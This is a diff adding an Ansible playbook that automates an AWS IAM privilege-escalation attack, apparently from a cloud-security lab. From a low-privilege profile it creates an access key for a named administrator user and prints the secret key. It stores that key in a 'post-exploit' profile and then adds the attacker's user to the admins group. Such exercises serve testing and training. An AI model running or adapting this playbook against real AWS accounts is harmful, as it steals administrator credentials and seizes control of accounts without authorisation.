@@ -1,0 +1,62 @@
+- hosts: localhost
+  gather_facts: True
+  vars_files: "../group_vars/vars.yml"
+  vars: 
+    - admin_to_exploit: "DJForbes@dreamport.tech"
+    - low_priv_profile: "privesc4"
+    - post_exploit_profile: "admin_privesc4"
+    - playbook_name: 'privesc4-CreateAccessKey.yml'
+  tasks:
+    - name: Run Create-access-key privesc4
+      shell: aws iam create-access-key --user-name {{ admin_to_exploit }} --profile "{{ low_priv_profile }}"
+      register: result
+      ignore_errors: yes
+
+    - name: Json response for created ec2 instance
+      debug:
+        msg: '{{ result.stdout }}'
+
+    - name: Set _Admin_Access_ID Fact
+      set_fact: Admin_Access_ID='{{ result.stdout | from_json | json_query("AccessKey") | json_query("AccessKeyId") }}'
+
+    - name: Admin_Access_ID
+      debug:
+        msg: '{{ Admin_Access_ID }}'
+
+    - name: Set Admin_Access_Key Fact
+      set_fact: Admin_Access_Key='{{ result.stdout | from_json | json_query("AccessKey") | json_query("SecretAccessKey") }}'
+
+    - name: Admin_Access_Key
+      debug:
+        msg: '{{ Admin_Access_Key }}'
+
+    - name: add new line to aws config and credentials file to prevent pasrsing errors 
+      shell:  echo "\n" >> ~/.aws/config & echo "\n" >> ~/.aws/credentials 
+      ignore_errors: yes
+
+    - name: AWS Configure Admin_Access_ID
+      shell:  aws configure set profile."{{ post_exploit_profile }}".aws_access_key_id '{{ Admin_Access_ID }}'
+      ignore_errors: yes
+
+    - name: AWS Configure Admin_Access_Key 
+      shell:  aws configure set profile."{{ post_exploit_profile }}".aws_secret_access_key '{{ Admin_Access_Key }}'
+      ignore_errors: yes
+
+    - name: AWS Configure aws_region
+      shell:  aws configure set profile."{{ post_exploit_profile }}".region '{{ aws_region }}'
+      ignore_errors: yes
+
+    - name: Sleep for 5 seconds to wait for replication
+      wait_for:
+        timeout: 5
+      delegate_to: localhost
+
+    - name: Add privesc4 user to admins group 
+      shell: aws iam add-user-to-group --group-name admins --user-name "{{ privesc4 }}" --profile "{{ post_exploit_profile }}"
+      register: result2
+      ignore_errors: yes
+    
+    - name: Json response for admin policy attachment 
+      debug:
+        msg: '{{ result2 }}'
+
